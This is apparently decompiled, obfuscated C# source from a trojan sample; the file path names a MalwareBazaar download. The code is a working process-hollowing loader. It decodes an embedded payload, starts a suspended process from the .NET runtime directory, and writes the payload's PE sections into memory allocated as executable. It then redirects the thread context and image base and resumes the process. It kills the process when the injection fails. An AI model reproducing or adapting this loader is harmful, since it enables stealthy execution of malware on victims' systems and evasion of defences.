// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Jbkttgjy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2A819A-CCD1-40A6-A838-713DABA6E2A0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\UDS-Trojan.Multi.GenericML.xnet-ba0fec15d6c5e15df9fd3ac351711716a58c081b27b0f60fa90a77affd84a123.exe

using Jbkttgjy;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

internal static class \u0008\u2003
{
  internal static void \u0002()
  {
    int num = Liynqzii.\u0002().\u000F() ? 1 : 0;
    if (true)
      goto label_3;
label_1:
    bool flag;
    if (flag)
    {
      if (false)
        return;
      \u0008\u2003.\u0005();
      return;
    }
    \u0008\u2003.\u0003();
    return;
label_3:
    flag = num != 0;
    goto label_1;
  }

  private static void \u0003()
  {
    byte[] numArray1 = \u000E\u2000.\u0002(((IEnumerable<byte>) \u000F\u2004.\u0002()).Reverse<byte>().ToArray<byte>());
    if (true)
      goto label_3;
label_1:
    if (true)
      goto label_4;
label_2:
    int num1;
    if (true)
      num1 = 0;
    byte[] src;
    for (; num1 < 10; ++num1)
    {
      if (true)
        goto label_8;
label_7:
      \u0005\u2005.\u0006 obj1 = new \u0005\u2005.\u0006();
      \u0005\u2005.\u0008 obj2 = new \u0005\u2005.\u0008();
      ref \u0005\u2005.\u0006 local = ref obj1;
      int uint32 = (int) Convert.ToUInt32(Marshal.SizeOf(typeof (\u0005\u2005.\u0006)));
      if (true)
        local.\u0002 = (uint) uint32;
      int num2;
      try
      {
        string str1 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), Liynqzii.\u0002().\u0002() + \u0008\u2006.\u0002(2093218748));
        if (true)
          goto label_13;
label_11:
        string path;
        int num3 = !File.Exists(path) ? 1 : 0;
        if (true)
          goto label_14;
label_12:
        bool flag1;
        if (flag1)
        {
          string fullName = \u0003\u2002.\u0002().FullName;
          if (true)
            path = fullName;
        }
        int num4 = !string.IsNullOrEmpty(Liynqzii.\u0002().\u0003()) ? 1 : 0;
        if (true)
          goto label_19;
label_18:
        bool flag2;
        if (flag2)
        {
          string str2 = path + \u0008\u2006.\u0002(2093218104) + Liynqzii.\u0002().\u0003();
          if (true)
            path = str2;
        }
        if (!\u0008\u2005.\u0002\u2000((string) null, path, IntPtr.Zero, IntPtr.Zero, false, 134217732U, IntPtr.Zero, (string) null, ref obj1, ref obj2))
          throw new Exception();
        int num5 = (int) typeof (BitConverter).GetMethod(\u0008\u2006.\u0002(2093218695)).Invoke((object) null, new object[2]
        {
          (object) src,
          (object) 60
        });
        int num6 = (int) typeof (BitConverter).GetMethod(\u0008\u2006.\u0002(2093218695)).Invoke((object) null, new object[2]
        {
          (object) src,
          (object) (num5 + 52)
        });
        int[] numArray2 = new int[179];
        numArray2[0] = 65538;
        if (IntPtr.Size == 4 && !\u0008\u2005.\u0008(obj2.\u0003, numArray2))
          throw new Exception();
        int num7 = numArray2[41];
        int num8 = 0;
        try
        {
          uint length = 9000;
          uint num9 = length * 4U;
          IntPtr[] numArray3 = new IntPtr[(int) length];
          uint num10;
          \u0005\u2005.\u0002(numArray3, num9, out num10);
          uint num11 = num10 >> 2;
          for (uint index = 0; index < num11; ++index)
          {
            IntPtr num12 = \u0005\u2005.\u0002((\u0005\u2005.\u0005) 1040, false, numArray3[(int) index]);
            if (num12 != IntPtr.Zero)
            {
              StringBuilder stringBuilder = new StringBuilder(260);
              IntPtr zero = IntPtr.Zero;
              uint num13 = 0;
              \u0005\u2005.\u0002(num12, zero, (uint) Marshal.SizeOf(typeof (IntPtr)), out num13);
              if (\u0005\u2005.\u0003(num12, zero, stringBuilder, stringBuilder.Capacity) > 0U)
                stringBuilder.ToString();
              \u0005\u2005.\u0002(num12);
            }
            IntPtr num14 = numArray3[(int) index];
            StringBuilder stringBuilder1 = new StringBuilder(51);
            \u0005\u2005.\u0002(num12, stringBuilder1, stringBuilder1.Capacity);
          }
        }
        catch
        {
        }
        if (!\u0008\u2005.\u0005\u2000(obj2.\u0002, num7 + 8, ref num8, 4, ref num2))
          throw new Exception();
        if (num6 == num8 && \u0008\u2005.\u000F(obj2.\u0002, num8) != 0)
          throw new Exception();
        int num15 = (int) typeof (BitConverter).GetMethod(\u0008\u2006.\u0002(2093218695)).Invoke((object) null, new object[2]
        {
          (object) src,
          (object) (num5 + 80)
        });
        int num16 = (int) typeof (BitConverter).GetMethod(\u0008\u2006.\u0002(2093218695)).Invoke((object) null, new object[2]
        {
          (object) src,
          (object) (num5 + 84)
        });
        bool flag3 = false;
        int num17 = \u0008\u2005.\u0006(obj2.\u0002, num6, num15, 12288, 64);
        if (num17 == 0)
          throw new Exception();
        if (!\u0008\u2005.\u000E(obj2.\u0002, num17, src, num16, ref num2))
          throw new Exception();
        int num18 = num5 + 248;
        short int16 = BitConverter.ToInt16(src, num5 + 6);
        for (int index = 0; index < (int) int16; ++index)
        {
          int int32_1 = BitConverter.ToInt32(src, num18 + 12);
          int int32_2 = BitConverter.ToInt32(src, num18 + 16);
          int int32_3 = BitConverter.ToInt32(src, num18 + 20);
          if (int32_2 != 0)
          {
            byte[] dst = new byte[int32_2];
            Buffer.BlockCopy((Array) src, int32_3, (Array) dst, 0, dst.Length);
            if (!\u0008\u2005.\u000E(obj2.\u0002, num17 + int32_1, dst, dst.Length, ref num2))
              throw new Exception();
          }
          num18 += 40;
        }
        try
        {
          new \u0008\u2003.\u0002().\u0002(0, (Regex) null, new Regex(\u0008\u2006.\u0002(2093218709)), new Regex(\u0008\u2006.\u0002(2093218683)), new \u0008\u2003.\u0002.\u0002(\u0008\u2003.\u0002));
        }
        catch
        {
        }
        byte[] bytes = BitConverter.GetBytes(num17);
        if (!\u0008\u2005.\u000E(obj2.\u0002, num7 + 8, bytes, 4, ref num2))
          throw new Exception();
        int int32 = BitConverter.ToInt32(src, num5 + 40);
        if (flag3)
          num17 = num6;
        numArray2[44] = num17 + int32;
        if (IntPtr.Size == 4 && !\u0008\u2005.\u0005(obj2.\u0003, numArray2))
          throw new Exception();
        if (\u0008\u2005.\u0002(obj2.\u0003) == -1)
          throw new Exception();
        break;
label_19:
        flag2 = num4 != 0;
        goto label_18;
label_14:
        flag1 = num3 != 0;
        goto label_12;
label_13:
        path = str1;
        goto label_11;
      }
      catch
      {
        \u0008\u2003.\u0002(obj2);
        continue;
      }
label_8:
      num2 = 0;
      goto label_7;
    }
    Environment.Exit(0);
    return;
label_4:
    GC.Collect();
    goto label_2;
label_3:
    src = numArray1;
    goto label_1;
  }

  private static void \u0005()
  {
    byte[] numArray1 = \u000E\u2000.\u0002(((IEnumerable<byte>) \u000F\u2004.\u0002()).Reverse<byte>().ToArray<byte>());
    if (true)
      goto label_4;
label_1:
    if (true)
      goto label_5;
label_2:
    if (true)
      goto label_6;
label_3:
    int num1;
    if (true)
      num1 = 0;
    byte[] numArray2;
    int processId;
    for (; num1 < 10; ++num1)
    {
      try
      {
        int num2 = Marshal.ReadInt32((object) numArray2, 60);
        if (true)
          goto label_15;
label_9:
        int num3;
        int num4 = Marshal.ReadInt32((object) numArray2, num3 + 24 + 56);
        if (true)
          goto label_16;
label_10:
        int num5 = Marshal.ReadInt32((object) numArray2, num3 + 24 + 60);
        if (true)
          goto label_17;
label_11:
        int num6 = Marshal.ReadInt32((object) numArray2, num3 + 24 + 16);
        if (true)
          goto label_18;
label_12:
        int num7 = (int) Marshal.ReadInt16((object) numArray2, num3 + 4 + 2);
        if (true)
          goto label_19;
label_13:
        int num8 = (int) Marshal.ReadInt16((object) numArray2, num3 + 4 + 16);
        if (true)
          goto label_20;
label_14:
        long num9 = Marshal.ReadInt64((object) numArray2, num3 + 24 + 24);
        byte[] numArray3 = new byte[104];
        byte[] ptr = new byte[24];
        IntPtr num10 = \u0008\u2003.\u0002(1232, 16);
        string path = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), Liynqzii.\u0002().\u0002() + \u0008\u2006.\u0002(2093218748));
        if (!File.Exists(path))
          path = \u0003\u2002.\u0002().FullName;
        if (!string.IsNullOrEmpty(Liynqzii.\u0002().\u0003()))
          path = path + \u0008\u2006.\u0002(2093218104) + Liynqzii.\u0002().\u0003();
        string currentDirectory = Directory.GetCurrentDirectory();
        Marshal.WriteInt32(num10, 48, 1048603);
        int num11 = \u0006\u2005.\u0002\u2000((string) null, path, IntPtr.Zero, IntPtr.Zero, true, 12U, IntPtr.Zero, currentDirectory, numArray3, ptr) ? 1 : 0;
        long num12 = Marshal.ReadInt64((object) ptr, 0);
        long num13 = Marshal.ReadInt64((object) ptr, 8);
        processId = Marshal.ReadInt32((object) ptr, 16);
        int num14 = \u0006\u2005.\u000F(num12, num9);
        int num15;
        int num16 = \u0006\u2005.\u0006(num12, num9, (long) num15, 12288U, 64U);
        int num17;
        if (!\u0006\u2005.\u000E(num12, num9, numArray2, num17, 0L))
          throw new Exception();
        try
        {
          uint length = 9000;
          uint num18 = length * 4U;
          IntPtr[] numArray4 = new IntPtr[(int) length];
          uint num19;
          \u0005\u2005.\u0002(numArray4, num18, out num19);
          uint num20 = num19 >> 2;
          for (uint index = 0; index < num20; ++index)
          {
            IntPtr num21 = \u0005\u2005.\u0002((\u0005\u2005.\u0005) 1040, false, numArray4[(int) index]);
            if (num21 != IntPtr.Zero)
            {
              StringBuilder stringBuilder = new StringBuilder(260);
              IntPtr zero = IntPtr.Zero;
              uint num22 = 0;
              \u0005\u2005.\u0002(num21, zero, (uint) Marshal.SizeOf(typeof (IntPtr)), out num22);
              if (\u0005\u2005.\u0003(num21, zero, stringBuilder, stringBuilder.Capacity) > 0U)
                stringBuilder.ToString();
              \u0005\u2005.\u0002(num21);
            }
            IntPtr num23 = numArray4[(int) index];
            StringBuilder stringBuilder1 = new StringBuilder(51);
            \u0005\u2005.\u0002(num21, stringBuilder1, stringBuilder1.Capacity);
          }
        }
        catch
        {
        }
        short num24;
        short num25;
        for (short index = 0; (int) index < (int) num24; ++index)
        {
          byte[] numArray5 = new byte[40];
          Buffer.BlockCopy((Array) numArray2, num3 + (24 + (int) num25) + 40 * (int) index, (Array) numArray5, 0, 40);
          int num26 = Marshal.ReadInt32((object) numArray5, 12);
          int length = Marshal.ReadInt32((object) numArray5, 16);
          int srcOffset = Marshal.ReadInt32((object) numArray5, 20);
          byte[] dst = new byte[length];
          Buffer.BlockCopy((Array) numArray2, srcOffset, (Array) dst, 0, dst.Length);
          if (!\u0006\u2005.\u000E(num12, num9 + (long) num26, dst, dst.Length, 0L))
            throw new Exception();
        }
        try
        {
          new \u0008\u2003.\u0002().\u0002(0, (Regex) null, new Regex(\u0008\u2006.\u0002(2093218709)), new Regex(\u0008\u2006.\u0002(2093218683)), new \u0008\u2003.\u0002.\u0002(\u0008\u2003.\u0002));
        }
        catch
        {
        }
        int num27 = \u0006\u2005.\u0008(num13, num10) ? 1 : 0;
        byte[] bytes = BitConverter.GetBytes(num9);
        long num28 = Marshal.ReadInt64(num10, 136);
        if (!\u0006\u2005.\u000E(num12, num28 + 16L, bytes, 8, 0L))
          throw new Exception();
        int num29;
        Marshal.WriteInt64(num10, 128, num9 + (long) num29);
        int num30 = \u0006\u2005.\u0005(num13, num10) ? 1 : 0;
        int num31 = \u0006\u2005.\u0002(num13);
        Marshal.FreeHGlobal(num10);
        int num32 = \u0006\u2005.\u0003\u2000(num12);
        int num33 = \u0006\u2005.\u0003\u2000(num13);
        break;
label_20:
        num25 = (short) num8;
        goto label_14;
label_19:
        num24 = (short) num7;
        goto label_13;
label_18:
        num29 = num6;
        goto label_12;
label_17:
        num17 = num5;
        goto label_11;
label_16:
        num15 = num4;
        goto label_10;
label_15:
        num3 = num2;
        goto label_9;
      }
      catch
      {
        try
        {
          Process.GetProcessById(processId).Kill();
        }
        catch
        {
        }
      }
    }
    Environment.Exit(0);
    return;
label_6:
    processId = 0;
    goto label_3;
label_5:
    GC.Collect();
    goto label_2;
label_4:
    numArray2 = numArray1;
    goto label_1;
  }

  private static void \u0002(\u0005\u2005.\u0008 _param0)
  {
    try
    {
      \u0005\u2005.\u0008 obj = _param0;
      if (true)
        ;
      Process.GetProcessById(Convert.ToInt32(obj.\u0005)).Kill();
    }
    catch
    {
      if (false)
        ;
    }
  }

  private static bool \u0002(int _param0)
  {
    bool flag;
    try
    {
      Rectangle rectangle = new Rectangle();
      \u0005\u2005.\u0002(_param0, ref rectangle);
      ref Rectangle local1 = ref rectangle;
      int num1 = rectangle.Width - rectangle.X;
      if (true)
        goto label_3;
label_1:
      ref Rectangle local2 = ref rectangle;
      int num2 = rectangle.Height - rectangle.Y;
      if (true)
        goto label_4;
label_2:
      if (true)
      {
        flag = true;
        goto label_8;
      }
      else
        goto label_8;
label_4:
      local2.Height = num2;
      goto label_2;
label_3:
      local1.Width = num1;
      goto label_1;
    }
    catch
    {
    }
    flag = false;
label_8:
    return flag;
  }

  private static IntPtr \u0002(IntPtr _param0, int _param1)
  {
    long num1 = _param0.ToInt64() + (long) (_param1 - 1);
    if (true)
      goto label_4;
label_1:
    long num2;
    long num3 = (long) _param1 * (num2 / (long) _param1);
    if (true)
      goto label_5;
label_2:
    long num4;
    IntPtr num5 = new IntPtr(num4);
    if (true)
      goto label_6;
label_3:
    IntPtr num6;
    return num6;
label_6:
    num6 = num5;
    goto label_3;
label_5:
    num4 = num3;
    goto label_2;
label_4:
    num2 = num1;
    goto label_1;
  }

  private static IntPtr \u0002(int _param0, int _param1)
  {
    IntPtr num1 = Marshal.AllocHGlobal(_param0 + _param1 / 2);
    if (true)
      goto label_3;
label_1:
    IntPtr num2;
    IntPtr num3 = \u0008\u2003.\u0002(num2, _param1);
    if (true)
      goto label_4;
label_2:
    IntPtr num4;
    return num4;
label_4:
    num4 = num3;
    goto label_2;
label_3:
    num2 = num1;
    goto label_1;
  }

  private sealed class \u0002
  {
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    private \u0008\u2003.\u0002.\u0002 \u0002;
    private int \u0003;
    private Regex \u0005;
    private Regex \u0008;
    private Regex \u0006;

    public \u0002()
    {
      if (true)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    private void \u0002(\u0008\u2003.\u0002.\u0002 _param1)
    {
      \u0008\u2003.\u0002.\u0002 obj1 = this.\u0002;
      \u0008\u2003.\u0002.\u0002 obj2;
      if (true)
        obj2 = obj1;
      \u0008\u2003.\u0002.\u0002 comparand;
      do
      {
        \u0008\u2003.\u0002.\u0002 obj3 = obj2;
        if (true)
          goto label_6;
label_3:
        \u0008\u2003.\u0002.\u0002 obj4 = comparand + _param1;
        if (true)
          goto label_7;
label_4:
        \u0008\u2003.\u0002.\u0002 obj5;
        obj2 = Interlocked.CompareExchange<\u0008\u2003.\u0002.\u0002>(ref this.\u0002, obj5, comparand);
        continue;
label_7:
        obj5 = obj4;
        goto label_4;
label_6:
        comparand = obj3;
        goto label_3;
      }
      while (obj2 != comparand);
    }

    private void \u0003(\u0008\u2003.\u0002.\u0002 _param1)
    {
      \u0008\u2003.\u0002.\u0002 obj1 = this.\u0002;
      \u0008\u2003.\u0002.\u0002 obj2;
      if (true)
        obj2 = obj1;
      \u0008\u2003.\u0002.\u0002 comparand;
      do
      {
        \u0008\u2003.\u0002.\u0002 obj3 = obj2;
        if (true)
          goto label_6;
label_3:
        \u0008\u2003.\u0002.\u0002 obj4 = comparand - _param1;
        if (true)
          goto label_7;
label_4:
        \u0008\u2003.\u0002.\u0002 obj5;
        obj2 = Interlocked.CompareExchange<\u0008\u2003.\u0002.\u0002>(ref this.\u0002, obj5, comparand);
        continue;
label_7:
        obj5 = obj4;
        goto label_4;
label_6:
        comparand = obj3;
        goto label_3;
      }
      while (obj2 != comparand);
    }

    internal void \u0002(
      int _param1,
      Regex _param2,
      Regex _param3,
      Regex _param4,
      \u0008\u2003.\u0002.\u0002 _param5)
    {
      try
      {
        int num = _param1;
        if (true)
          goto label_4;
label_1:
        Regex regex1 = _param2;
        if (true)
          goto label_5;
label_2:
        Regex regex2 = _param3;
        if (true)
          goto label_6;
label_3:
        this.\u0006 = _param4;
        this.\u0002 = _param5;
        \u0005\u2005.\u0002(_param1, new \u0005\u2005.\u0003(this.\u0002), 0);
        return;
label_6:
        this.\u0008 = regex2;
        goto label_3;
label_5:
        this.\u0005 = regex1;
        goto label_2;
label_4:
        this.\u0003 = num;
        goto label_1;
      }
      catch
      {
      }
    }

    private bool \u0002(int _param1, int _param2)
    {
      bool flag1;
      try
      {
        int num1 = this.\u0005 != null ? 1 : 0;
        if (true)
          goto label_2;
label_1:
        bool flag2;
        if (flag2)
        {
          StringBuilder stringBuilder1 = new StringBuilder(256);
          if (true)
            goto label_6;
label_4:
          int num2 = _param1;
          StringBuilder stringBuilder2;
          StringBuilder stringBuilder3 = stringBuilder2;
          int capacity = stringBuilder2.Capacity;
          if (true)
            goto label_7;
label_5:
          if (!this.\u0005.IsMatch(stringBuilder2.ToString()))
          {
            flag1 = true;
            goto label_17;
          }
          else
            goto label_9;
label_7:
          \u0005\u2005.\u0002(num2, stringBuilder3, capacity);
          goto label_5;
label_6:
          stringBuilder2 = stringBuilder1;
          goto label_4;
        }
label_9:
        if (this.\u0008 != null)
        {
          flag1 = true;
          goto label_17;
        }
        else
        {
          if (this.\u0006 != null)
          {
            int processId;
            \u0005\u2005.\u0002(_param1, out processId);
            if (!this.\u0006.IsMatch(Process.GetProcessById(processId).ProcessName))
            {
              flag1 = true;
              goto label_17;
            }
          }
          flag1 = this.\u0002(_param1);
          goto label_17;
        }
label_2:
        flag2 = num1 != 0;
        goto label_1;
      }
      catch
      {
      }
      flag1 = false;
label_17:
      return flag1;
    }

    internal delegate bool \u0002(int _param1);
  }
}
